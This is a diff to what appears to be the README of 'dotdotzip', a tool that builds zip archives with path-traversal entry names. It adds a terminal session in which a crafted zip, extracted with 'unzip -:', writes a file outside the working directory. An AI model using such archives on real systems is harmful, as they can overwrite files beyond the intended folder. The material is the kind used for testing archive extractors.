@@ -40,5 +40,12 @@ UEsDBBQAAAAAAEt0I1312nQfKAEAACgBAABXAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 Example (filesystem):
 
 ```
-$ python3 dotdotzip.py --zip-name test.zip --prepend-path '/Users/realkstrawn93/Desktop' --traverse-count 15 --pack-files pyproject.toml
+realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ mkdir ../test
+realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ dotdotzip --prepend-path '/Users/realkstrawn93/test' --traverse-count 15 --pack-files gdb.txt --zip-name test.zip
+realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ unzip -: test.zip 
+Archive:  test.zip
+ extracting: ../../../../../../../../../../../../../../../Users/realkstrawn93/test/gdb.txt  
+realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ ls ~/test
+gdb.txt
+realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ 
 ```
